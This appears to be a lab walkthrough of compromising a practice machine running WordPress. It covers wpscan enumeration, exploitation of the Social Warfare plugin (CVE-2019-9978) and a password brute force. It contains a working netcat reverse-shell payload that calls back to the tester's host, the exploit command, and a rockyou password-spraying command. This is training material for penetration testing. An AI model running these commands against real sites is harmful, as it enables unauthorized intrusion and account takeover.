# 3 :80 wordpress

```
$ wpscan --url 192.168.105.78/wordpress -e u, vp

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)

[i] Plugin(s) Identified:
[+] simple-cart-solution
 | Location: http://192.168.105.78/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2020-11-16T21:39:00.000Z
 | [!] The version is out of date, the latest version is 1.0.1
 | Version: 0.2.0 (100% confidence)

[+] social-warfare
 | Location: http://192.168.105.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 | Version: 3.5.0 (100% confidence)

[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)

[+] max
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 
# found exploit for social warfare
https://www.exploit-db.com/exploits/46794
https://github.com/hash3liZer/CVE-2019-9978
(manual) https://github.com/shad0w008/social-warfare-RCE

# using https://github.com/hash3liZer/CVE-2019-9978
# save payload in .txt and host it locally
$ python 46794.py -t http://192.168.105.78/wordpress/ --payload-uri http://192.168.49.105/exploit.txt

# using payload <pre>system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.49.105 7070 >/tmp/f")</pre>
$ nc -lvnp 7070
listening on [any] 7070 ...
connect to [192.168.49.105] from (UNKNOWN) [192.168.105.78] 46010
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
www-data@so-simple:/var/www/html/wordpress/wp-admin$ whoami;id;hostname
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
so-simple
```

#### Bruteforcing

```
$ wpscan --url 192.168.105.78/wordpress --usernames users --passwords /usr/share/wordlist/rockyou.txt --max-threads 50
[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - max / opensesame
```
